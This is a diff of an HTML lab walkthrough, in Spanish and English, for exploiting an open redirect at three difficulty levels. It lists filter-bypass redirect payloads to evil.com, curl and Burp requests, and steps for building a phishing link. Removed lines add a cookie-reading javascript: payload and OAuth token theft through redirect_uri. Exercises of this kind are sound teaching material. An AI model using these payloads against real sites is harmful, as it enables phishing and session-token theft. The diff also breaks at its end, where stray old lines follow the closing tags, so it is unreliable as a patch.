@@ -26,35 +26,31 @@
   <div class="lang-content" data-lang="es">
     <h3>Pasos de explotación</h3>
     <ol>
-      <li>Identifica el endpoint vulnerable: <code>/open_redirect?url=</code> acepta una URL y redirige al usuario a ella sin validación.</li>
-      <li>Comprueba la redirección básica con curl:
+      <li>Identifica el endpoint vulnerable: <code>/open_redirect?url=</code> acepta una URL y redirige al usuario a ella.</li>
+      <li>Comprueba la redirección con curl:
         <pre>curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"</pre>
         Busca la cabecera <code>Location: https://evil.com</code> en la respuesta HTTP 302.</li>
-      <li>Prueba técnicas de bypass según el nivel de dificultad:
-        <pre># Protocol-relative (bypass Medium)
+      <li><strong>Easy:</strong> No hay filtro — cualquier URL externa funciona:
+        <pre>/open_redirect?url=https://evil.com</pre></li>
+      <li><strong>Medium:</strong> Bloquea URLs que empiecen con <code>http://</code> o <code>https://</code> externo. Bypass con protocol-relative:
+        <pre># Protocol-relative — el navegador redirige a http://evil.com
 /open_redirect?url=//evil.com
 
-# Backslash (bypass Medium)
-/open_redirect?url=/\evil.com
+# Backslash — el navegador normaliza \ a / → //evil.com
+/open_redirect?url=/\evil.com</pre></li>
+      <li><strong>Hard:</strong> Bloquea dominios externos + protocol-relative (<code>//</code>). Bypass con backslash:
+        <pre># El filtro comprueba startswith("//") pero no "/\\"
+# El navegador normaliza \ a / → Location: //evil.com → redirect externo
+/open_redirect?url=/\evil.com</pre></li>
+      <li>Verifica en Burp Suite Repeater:
+        <pre>GET /open_redirect?url=/\evil.com HTTP/1.1
+Host: TARGET_IP
 
-# Protocolo javascript (bypass Medium)
-/open_redirect?url=javascript:alert(document.cookie)
-
-# URL con @ para confundir el parser (bypass Hard)
-/open_redirect?url=https://trusted.com@evil.com
-
-# Tab/whitespace antes del dominio (bypass Hard)
-/open_redirect?url=//	evil.com
-
-# Doble URL encoding (bypass Hard) 
-/open_redirect?url=%2f%2fevil.com</pre></li>
-      <li>Usa Burp Suite Repeater para probar los diferentes payloads:
-        <pre>GET /open_redirect?url=//evil.com HTTP/1.1
-Host: TARGET_IP</pre></li>
-      <li>Construye un enlace de phishing creíble combinando el dominio legítimo con el redirect:
-        <pre>http://TARGET_IP/open_redirect?url=https://evil.com/login</pre>
+# Respuesta: HTTP 302 Location: /\evil.com
+# El navegador normaliza a //evil.com → redirect a evil.com</pre></li>
+      <li>Construye un enlace de phishing creíble:
+        <pre>http://TARGET_IP/open_redirect?url=//evil.com/login</pre>
         La víctima ve el dominio de confianza y hace clic, pero termina en el sitio del atacante.</li>
-      <li>Encadena con robo de tokens OAuth: si la aplicación tiene un flujo de autenticación, usa el open redirect como <code>redirect_uri</code> para capturar el token de sesión en tu servidor.</li>
     </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Browser DevTools</span></div>
@@ -62,27 +58,36 @@ Host: TARGET_IP</pre></li>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Exploitation Steps</h3>
     <ol>
-      <li>Identify the vulnerable endpoint: <code>/open_redirect?url=</code> takes a URL and redirects the user to it without validation.</li>
-      <li>Verify the basic redirect with curl:
+      <li>Identify the vulnerable endpoint: <code>/open_redirect?url=</code> takes a URL and redirects the user.</li>
+      <li>Verify the redirect with curl:
         <pre>curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"</pre>
         Look for the <code>Location: https://evil.com</code> header in the HTTP 302 response.</li>
-      <li>Test bypass techniques based on difficulty level:
-        <pre># Protocol-relative (bypasses Medium)
+      <li><strong>Easy:</strong> No filter — any external URL works:
+        <pre>/open_redirect?url=https://evil.com</pre></li>
+      <li><strong>Medium:</strong> Blocks URLs starting with external <code>http://</code> or <code>https://</code>. Bypass with protocol-relative:
+        <pre># Protocol-relative — browser redirects to http://evil.com
 /open_redirect?url=//evil.com
 
-# Backslash (bypasses Medium)
-/open_redirect?url=/\evil.com
+# Backslash — browser normalizes \ to / → //evil.com
+/open_redirect?url=/\evil.com</pre></li>
+      <li><strong>Hard:</strong> Blocks external domains + protocol-relative (<code>//</code>). Bypass with backslash:
+        <pre># Filter checks startswith("//") but not "/\\"
+# Browser normalizes \ to / → Location: //evil.com → external redirect
+/open_redirect?url=/\evil.com</pre></li>
+      <li>Verify in Burp Suite Repeater:
+        <pre>GET /open_redirect?url=/\evil.com HTTP/1.1
+Host: TARGET_IP
 
-# Javascript protocol (bypasses Medium)
-/open_redirect?url=javascript:alert(document.cookie)
-
-# URL with @ to confuse the parser (bypasses Hard)
-/open_redirect?url=https://trusted.com@evil.com
-
-# Tab/whitespace before domain (bypasses Hard)
-/open_redirect?url=//	evil.com
-
-# Double URL encoding (bypasses Hard)
+# Response: HTTP 302 Location: /\evil.com
+# Browser normalizes to //evil.com → redirects to evil.com</pre></li>
+      <li>Craft a convincing phishing link:
+        <pre>http://TARGET_IP/open_redirect?url=//evil.com/login</pre>
+        The victim sees the trusted domain and clicks, but ends up on the attacker's site.</li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Browser DevTools</span></div>
+  </div>
+</div>
 /open_redirect?url=%2f%2fevil.com</pre></li>
       <li>Use Burp Suite Repeater to test different payloads:
         <pre>GET /open_redirect?url=//evil.com HTTP/1.1
